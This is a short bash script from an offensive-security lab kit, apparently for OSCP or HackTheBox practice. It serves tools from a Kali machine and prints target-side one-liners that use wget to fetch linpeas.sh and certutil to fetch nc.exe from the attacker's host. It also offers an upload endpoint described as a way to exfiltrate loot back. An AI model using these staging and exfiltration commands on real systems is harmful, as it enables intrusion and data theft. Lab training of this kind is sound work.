#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# Serve the staged tool kit over HTTP. Usage: ./serve.sh [port]
# Server preference (each degrades gracefully to the next):
#   1. updog             - download + browser upload endpoint (exfil loot back to Kali)
#   2. fuzzy-httpserver  - typo-tolerant: serves the right file even if the wget path has a typo
#   3. python http.server - download only, always present
cd "$KIT/serve" || exit 1
PORT="${1:-80}"

# --- auto-detect the VPN IP so the printed one-liners are paste-ready ---
# Prefer tun0 (OSCP/HTB/PG VPN); fall back to the first global-scope address.
KALI="$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
if [ -z "$KALI" ]; then
  KALI="$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
  [ -n "$KALI" ] && echo "[!] tun0 not found - using $KALI (not the VPN?). Fix the IP in the one-liners if wrong."
fi
KALI="${KALI:-<KALI>}"

echo "[*] Serving $(pwd) on 0.0.0.0:$PORT  (Kali IP: $KALI)"
echo "    Linux:    wget http://$KALI:$PORT/linux/linpeas.sh -O /tmp/lp.sh"
echo "    Windows:  certutil -urlcache -f http://$KALI:$PORT/windows/nc.exe nc.exe"

if command -v updog >/dev/null; then
  echo "    (updog: browser upload at http://$KALI:$PORT/upload - exfil loot back; uploads land in $(pwd))"
  sudo "$(command -v updog)" -d . -p "$PORT"
elif command -v fuzzy-httpserver >/dev/null; then
  echo "    (fuzzy-httpserver: typo-tolerant matching enabled; download only)"
  sudo "$(command -v fuzzy-httpserver)" -p "$PORT" -d .
else
  echo "    (python http.server: download only. 'pip install updog' to add an upload endpoint.)"
  sudo python3 -m http.server "$PORT"
fi
